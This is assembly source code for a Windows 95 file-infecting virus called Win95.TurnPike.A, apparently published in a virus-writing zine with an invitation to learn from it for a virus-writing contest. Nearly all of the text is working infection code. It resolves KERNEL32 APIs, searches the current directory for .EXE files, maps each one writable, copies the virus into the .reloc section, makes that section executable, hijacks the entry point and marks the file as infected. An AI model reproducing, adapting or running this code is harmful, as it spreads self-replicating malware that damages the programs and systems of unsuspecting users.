; Win95.TurnPike.A
;   Written By Rat Heart /Assoc. of Satanic Maniac's!

; Size = 1CFh = 463 Bytes!!!!!!
; Original = 26Fh = 623 Bytes
; Optimisation saved me 160 Bytes!!!!!!

; Win95.TurnPike.A is a run-time mid-infector, TurnPike scans
;the current directory for EXE's, and checks whether they are
;PE's  and have  a .reloc section. If all is true, the  virus
;checks  if it  is small enough to fit inside the reloc  area
;(It should do, most .reloc's are at least 200h len). This is
;pretty small for an Win9x API virus,  in my opinion at least
;that's why I created a compo,  which can be found  somewhere
;else in this zine, I have made a Win32 version as well,  but
;that isn't gonna be released until after the zine.

; If you are entering the compo,  pls don't just modify this.
;Use this  to help you learn,  but don't just copy code,  add
;bits here and there etc.
;       Good luck!


                .386p
                .model flat

extrn   ExitProcess:PROC

        iNCLUDE RUiNER.iNC

KERN32          equ     0BFF70000h
VxMarker        equ     0CAFEh

API     macro   apiname
        call    dword ptr [ebp+offset apiname]
        endm


                .data
dh      db      '.'

                .code

vstart: xchg    ebp,eax
        sub     ebp,offset vstart

cryptstart:
        mov     ebx,KERN32                      ;EBX = KERNEL32 Handle
        mov     edi,ebx
        add     edi,dword ptr [edi+3Ch]
        cmp     word ptr [edi],4550h            ;PE/0/0
        jne     RestoreHost                     ;Not Win95
        mov     edi,[edi+78h]                   ;EDI = Export RVA of Kern32
        add     edi,ebx                         ;EDI = Export Address (VA)
        mov     esi,[edi+20h]                   ;ESI = Name Ptr Table
        add     esi,ebx   
        mov     ecx,[edi+24h]                   ;ECX = Ordinal Table
        add     ecx,ebx   
        push    ecx
        mov     ecx,[edi+1Ch]                   ;ECX = Address Table
        add     ecx,ebx
        push    ecx

;[ESP]   = AdrTbl
;[ESP+4] = OrdTbl

        mov     ecx,[edi+18h]                   ;ECX = Number of Names
        xor     edx,edx

FindGPA:                                        ;'GetProcAddress',0
        lodsd
        add     eax,ebx                         ;Virt. Address of Name
        cmp     word ptr [eax+2],'Pt'
        jne     NotGPA
        cmp     byte ptr [eax+9h],'d'
        je      WorkOutRVA                      ;GetProcA
NotGPA: inc     edx
        loop    FindGPA

RestoreHost:
        push    0BFF8AECDh                      ;ExitProcess API for Win 95
        ret                                     ; v4.00.1111
RestoreHostAddress      equ     offset RestoreHost + 1

WorkOutRVA:
        shl     edx,1                           ;EDX = Ordinal Index
        add     edx,[esp+4h]
        movzx   eax,word ptr [edx]
        shl     eax,2h
        add     eax,[esp]
        mov     esi,[eax]                       ;ESI = RVA of GPA
        add     esi,ebx                         ;ESI = Virt. Addr of GPA!

        lea     edi,[ebp+offset FindFirst]

        lea     eax,[ebp+offset n_FindFirst]
        call    GetNSave

        lea     eax,[ebp+offset n_FindNext]
        call    GetNSave

        lea     eax,[ebp+offset n_lopen]
        call    GetNSave

        lea     eax,[ebp+offset n_createmap]
        call    GetNSave

        lea     eax,[ebp+offset n_viewmap]
        call    GetNSave


FindTheFirstFile:
        lea     eax,[ebp+offset FoundFile]
        push    eax
        push    eax
        lea     eax,[ebp+offset FlID]
        push    eax
        API     FindFirst
        mov     [ebp+offset FindHnd],eax
        inc     eax
        jz      RestoreHost

GotOne:
        push    OF_READWRITE
        lea     eax,[ebp+offset FoundFile.WFD_szFileName]
        push    eax
        API     lopen
        inc     eax
        jz      FeckOff
        dec     eax

        xor     ebx,ebx
        push    ebx ebx ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        API     createmap

        push    ebx ebx ebx
        push    FILE_MAP_WRITE
        push    eax
        API     viewmap
        mov     esi,eax

        mov     ebx,[eax+3Ch]
        add     eax,ebx
        cmp     word ptr [eax],'EP'             ;Is PE?
        jne     FeckOff

        cmp     word ptr [eax+VxChk],VxMarker   ;Is Infected?
        je      FeckOff

        mov     word ptr [eax+VxChk],VxMarker   ;Set Infected!

        mov     edi,eax
        add     edi,Entry                       ;EDI => Entry IP
        push    edi
        mov     ebx,[edi]
        add     ebx,[edi+ImgBs-Entry]
        push    ebx                             ;Save Ret Addres

        movzx   ecx,word ptr [eax+NoObj]    ;ECX = Number of Objects
        add     eax,0F8h                        ;Goto Obj Tables!
findreloc:
        cmp     word ptr [eax],'r.'          ;.reloc
        jne     nextobj
        cmp     word ptr [eax+4h],'co'
        je      foundreloc
nextobj:
        add     eax,Objlen                      ;Goto next Obj
        loop    findreloc
noreloc:
        pop     edi
        jmp     FeckOff

foundreloc:                                     ;EAX => Object
        cmp     dword ptr [eax+Objpsize],vir_len  ;Can we fit?
        jl      noreloc                           ;Nope, leave
        mov     edi,[eax+Objpoffs]
        add     edi,esi
        lea     esi,[ebp+offset vstart]
        mov     ecx,vir_len
        rep     movsb                           ;Move virus to reloc
        pop     ebx
        mov     [edi-RetFromEnd],ebx

        mov     byte ptr [eax+Objflags+3h],0C0h ;Set Executable! ;)

        pop     edi
        mov     esi,eax
        add     esi,Objrva
        movsd

FeckOff:
        push    dword ptr [ebp+offset FindHnd]
        API     FindNext
        sub     esp,4h
        or      eax,eax
        jz      RestoreHost

        jmp     GotOne

FlID            db      '*.EXE',0

n_FindFirst     db      'FindFirstFileA',0
n_FindNext      db      'FindNextFileA',0
n_lopen         db      '_lopen',0
n_createmap     db      'CreateFileMappingA',0
n_viewmap       db      'MapViewOfFile',0

GetNSave:
        push    eax
        push    ebx
        call    esi
        stosd
        ret

cryptend:
vend:

FindFirst       dd      0
FindNext        dd      0
lopen           dd      0
createmap       dd      0
viewmap         dd      0

FindHnd         dd      0
MapHnd          dd      0
ObjOff          dd      0
physoff         dd      0

FoundFile       WIN32_FIND_DATA ?

Buffer          equ             $

CPUty           equ             04h
NoObj           equ             06h
VxChk           equ             18h
Entry           equ             28h
ImgBs           equ             34h
ObjAl           equ             38h
FlAlg           equ             3Ch
Chxum           equ             58h
SbSys           equ             5Ch

Objvsize        equ             08h
Objrva          equ             0Ch
Objpsize        equ             10h
Objpoffs        equ             14h
Objflags        equ             Objlen-4h

Objlen          equ     28h

RetFromEnd      equ     offset vend - RestoreHostAddress

vir_len equ     offset vend - offset vstart
buf_len equ     offset Buffer - offset vend
vtl_len equ     buf_len + vir_len

        end     vstart
